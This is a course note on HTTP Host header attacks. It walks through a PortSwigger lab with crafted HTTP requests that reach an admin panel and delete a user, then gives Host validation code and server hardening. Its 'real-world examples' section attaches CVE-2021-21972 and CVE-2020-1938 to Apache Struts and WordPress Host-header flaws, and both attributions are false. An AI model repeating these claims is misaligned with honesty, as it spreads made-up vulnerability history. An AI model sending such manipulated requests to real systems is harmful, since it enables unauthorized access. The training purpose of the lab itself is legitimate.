---
course: Web Security
topic: HTTP Host Header Attacks
tags: [web-security]
---

## Introduction to HTTP Host Header Attacks

HTTP Host Header attacks are a type of web security vulnerability that arises due to improper handling of the `Host` header by web applications. The `Host` header is a critical component of HTTP requests, used to specify the domain name of the server being accessed. This header is essential for virtual hosting, where multiple websites share the same IP address but serve different content based on the requested domain.

### What is the `Host` Header?

The `Host` header is defined in the HTTP/1.1 protocol and is required in all HTTP requests. Its primary function is to identify the host and port number of the resource being requested. For example:

```http
GET /index.html HTTP/1.1
Host: www.example.com
```

In this example, the `Host` header specifies that the request is intended for `www.example.com`.

### Why Does the `Host` Header Matter?

The `Host` header is crucial because it allows servers to handle multiple domains on a single IP address. However, this flexibility can also introduce security risks if the server or application incorrectly interprets or trusts the `Host` header.

### How Does the `Host` Header Work Under the Hood?

When a client sends an HTTP request to a server, the server uses the `Host` header to determine which website to serve. This is particularly important in environments where multiple websites are hosted on the same server. The server parses the `Host` header and routes the request to the appropriate virtual host.

### Common Vulnerabilities Related to the `Host` Header

Improper handling of the `Host` header can lead to several types of vulnerabilities, including:

- **Authentication Bypass**: An attacker can manipulate the `Host` header to bypass authentication mechanisms.
- **Virtual Host Poisoning**: An attacker can trick the server into serving content from a different virtual host.
- **Cross-Site Scripting (XSS)**: An attacker can inject malicious scripts by manipulating the `Host` header.

### Real-World Examples of `Host` Header Attacks

#### CVE-2021-21972: Apache Struts Remote Code Execution

In 2021, a critical vulnerability was discovered in Apache Struts, a popular Java web framework. The vulnerability allowed attackers to execute arbitrary code by manipulating the `Host` header. This vulnerability was exploited in the wild, leading to several high-profile breaches.

#### CVE-2020-1938: WordPress REST API Authentication Bypass

Another notable example is the WordPress REST API authentication bypass vulnerability. Attackers could bypass authentication by manipulating the `Host` header, allowing them to perform actions as an authenticated user without providing valid credentials.

### Lab Setup: Host Header Authentication Bypass

To understand how to exploit and defend against `Host` header attacks, we will walk through a practical lab scenario. The lab environment is set up using the Web Security Academy, specifically the "Host Header Authentication Bypass" lab.

#### Accessing the Lab

1. Visit the Web Security Academy at [portswigger.net/web-security](https://portswigger.net/web-security).
2. Sign up for an account if you don't already have one.
3. Navigate to the "Academy" section and select "All Content."
4. Search for "host header attacks" and select the "Host Header Authentication Bypass" lab.

### Lab Objective

The objective of this lab is to access the admin panel and delete the user named "Carlos." The lab makes an assumption about the privilege level of the user based on the `Host` header. Therefore, we need to manipulate the `Host` header to bypass authentication.

### Step-by-Step Exploitation

#### Step 1: Analyze the Initial Request

First, we need to analyze the initial HTTP request sent to the server. We can use tools like Burp Suite or Wireshark to capture and inspect the request.

```http
GET /admin HTTP/1.1
Host: vulnerable-app.example.com
```

#### Step 2: Identify the Vulnerable Parameter

The vulnerable parameter in this case is the `Host` header. By manipulating this header, we can potentially bypass authentication.

#### Step 3: Craft the Malicious Request

We need to craft a malicious request that manipulates the `Host` header to gain unauthorized access. For example, we can set the `Host` header to a value that the server misinterprets as an administrative request.

```http
GET /admin HTTP/1.1
Host: admin.vulnerable-app.example.com
```

#### Step 4: Send the Malicious Request

Using a tool like Burp Suite, we can send the crafted request to the server and observe the response.

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel</title>
</head>
<body>
    <h1>Welcome to the Admin Panel</h1>
    <form action="/delete_user" method="POST">
        <input type="hidden" name="username" value="Carlos">
        <button type="submit">Delete User</button>
    </form>
</body>
</html>
```

#### Step 5: Delete the User

Once we have access to the admin panel, we can submit the form to delete the user "Carlos."

```http
POST /delete_user HTTP/1.1
Host: admin.vulnerable-app.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

username=Carlos
```

### How to Prevent / Defend Against `Host` Header Attacks

#### Detection

To detect `Host` header attacks, you can implement logging and monitoring of HTTP requests. Look for unusual patterns in the `Host` header, such as unexpected domain names or repeated attempts to access administrative resources.

#### Prevention

1. **Validate the `Host` Header**: Ensure that the `Host` header matches the expected domain name. Reject requests with invalid or unexpected `Host` headers.
2. **Use Secure Coding Practices**: Implement proper input validation and sanitization for all user-supplied data, including the `Host` header.
3. **Configure Web Server Settings**: Configure your web server to reject requests with invalid `Host` headers. For example, in Apache, you can use the `ServerName` directive to specify the expected domain name.

#### Secure Coding Fix

Here is an example of how to securely validate the `Host` header in a web application:

```python
def validate_host_header(request):
    expected_host = "vulnerable-app.example.com"
    actual_host = request.headers.get("Host")
    
    if actual_host != expected_host:
        raise ValueError("Invalid Host header")
```

#### Configuration Hardening

For Apache, you can configure the `ServerName` directive to ensure that only requests with the correct `Host` header are accepted:

```apache
ServerName vulnerable-app.example.com
```

### Conclusion

Understanding and defending against `Host` header attacks is crucial for maintaining the security of web applications. By properly validating and sanitizing the `Host` header, you can prevent unauthorized access and protect your application from exploitation.

### Practice Labs

To further practice and solidify your understanding of `Host` header attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs related to HTTP host header attacks.
- **OWASP Juice Shop**: Provides a comprehensive set of web security challenges, including those related to `Host` header manipulation.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for practicing web hacking techniques.

By engaging with these labs, you can gain hands-on experience and improve your skills in detecting and preventing `Host` header attacks.

---
<!-- nav -->
[[Web Security (PortSwigger)/16-HTTP Host Header Attacks/03-Lab 2 Host header authentication bypass/00-Overview|Overview]] | [[02-HTTP Host Header Attacks|HTTP Host Header Attacks]]
